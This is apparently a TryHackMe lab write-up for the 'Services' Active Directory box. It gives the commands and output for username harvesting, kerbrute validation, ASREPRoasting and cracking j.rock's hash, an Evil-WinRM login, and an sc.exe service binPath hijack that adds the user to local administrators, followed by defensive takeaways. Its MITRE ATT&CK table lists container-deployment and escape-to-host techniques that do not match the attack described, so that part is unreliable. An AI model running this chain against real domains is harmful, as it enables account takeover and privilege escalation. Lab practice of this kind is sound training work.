# ⚙️ Services: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/services)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Windows%20AD-informational?style=for-the-badge&logo=windows)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `services.thm` / `services.local` |
| **OS** | Windows Server 2019 (Active Directory) |
| **Attack Surface** | Username harvest from website → kerbrute validation → ASREPRoast `j.rock` |
| **Privesc** | Server Operators group membership → writable service `binPath` → local admin → Domain Admin access |

Services is an Active Directory box. Staff names on the corporate website provide a candidate user list, validated via kerbrute. `j.rock` has pre-authentication disabled — ASREPRoasting yields a crackable hash. Once in via WinRM, `j.rock` is a member of Server Operators, which allows modifying service binary paths. Reconfiguring the `ADWS` service to add `j.rock` to local administrators grants full system access.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 services.thm -oA services-tcp-scan
```

```
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS 10.0
88/tcp   open  kerberos-sec
389/tcp  open  ldap          AD LDAP (Domain: services.local)
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  http          WinRM
```

### Username Harvest

Website (`services.thm/about.html`) lists staff:

```
Joanne Doe → j.doe
Jack Rock  → j.rock
Will Masters → w.masters
Johnny LaRusso → j.larusso
```

Contact page also reveals: `j.doe@services.local`

### Kerbrute Validation

```bash
./kerbrute userenum -d services.local ./users.txt --dc 10.10.157.183
```

```
[+] VALID USERNAME: j.doe@services.local
[+] VALID USERNAME: j.larusso@services.local
[+] VALID USERNAME: administrator@services.local
[+] VALID USERNAME: w.masters@services.local
[+] VALID USERNAME: j.rock@services.local
```

---

## 💀 Initial Access — ASREPRoast + WinRM

### ASREPRoast

```bash
impacket-GetNPUsers services.local/ -no-pass -usersfile users.txt -dc-ip 10.10.157.183
```

```
$krb5asrep$23$j.rock@SERVICES.LOCAL:<hash>
```

Only `j.rock` has `UF_DONT_REQUIRE_PREAUTH` set.

### Crack Hash

```bash
hashcat -m 18200 asrep.hash ./rockyou.txt -o cracked.txt
# j.rock → Serviceworks1
```

### WinRM Shell

```bash
evil-winrm -i services.local -u j.rock -p Serviceworks1
```

```
*Evil-WinRM* PS C:\Users\j.rock\Documents>
```

---

## 🔁 Privilege Escalation — j.rock → Administrator

### Server Operators Membership

```bash
net user j.rock /domain
```

```
Local Group Memberships: *Remote Management Use  *Server Operators
```

Server Operators can start, stop, and reconfigure services. Service `binPath` is writable — standard Server Operators privesc.

### Service binPath Hijack

```bash
sc.exe config ADWS binPath= "cmd.exe /c net localgroup administrators j.rock /add"
sc.exe start ADWS
```

```
net localgroup administrators
# Members: Administrator, Domain Admins, Enterprise Admins, j.rock
```

### Full Privileges

Reconnect with Evil-WinRM — `j.rock` is now a local admin with a full elevated token:

```
SeDebugPrivilege, SeImpersonatePrivilege, SeTakeOwnershipPrivilege... (full set)
```

---

## 🗺️ Attack Chain

```
[Website — about.html]
    Staff names → username list → kerbrute validation
          │
          ▼
[ASREPRoast — j.rock]
    UF_DONT_REQUIRE_PREAUTH → hash → Serviceworks1
    Evil-WinRM → j.rock shell
          │
          ▼
[Server Operators]
    sc.exe config ADWS binPath= "net localgroup administrators j.rock /add"
    sc.exe start ADWS → j.rock added to local admins
    Full elevated token → system access
```

---

## 📌 Key Takeaways

- Staff directories on corporate websites are a direct username source for AD attacks; even "About" pages with first/last names are enough to generate valid UPN formats
- ASREPRoasting requires no credentials — any account with `UF_DONT_REQUIRE_PREAUTH` is vulnerable; audit this regularly with `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}`
- Server Operators group membership grants service control — treat it as a high-privilege group and restrict membership accordingly
- Service `binPath` reconfiguration is a well-known Server Operators abuse path; monitor service config changes via Windows event ID 7040

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Defense Evasion | Deploy Container | [T1610](https://attack.mitre.org/techniques/T1610) |
| Privilege Escalation | Escape to Host | [T1611](https://attack.mitre.org/techniques/T1611) |

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `kerbrute` | Validate harvested usernames against Kerberos |
| `impacket-GetNPUsers` | ASREPRoast accounts with pre-auth disabled |
| `hashcat` | Crack AS-REP hash |
| `evil-winrm` | WinRM shell as j.rock |
| `sc.exe` | Reconfigure ADWS service binPath to add j.rock to local admins |

## 🚩 Flags

<details>
<summary><code>user.txt</code></summary>

`TBD`

</details>

<details>
<summary><code>root.txt</code></summary>

`TBD`

</details>
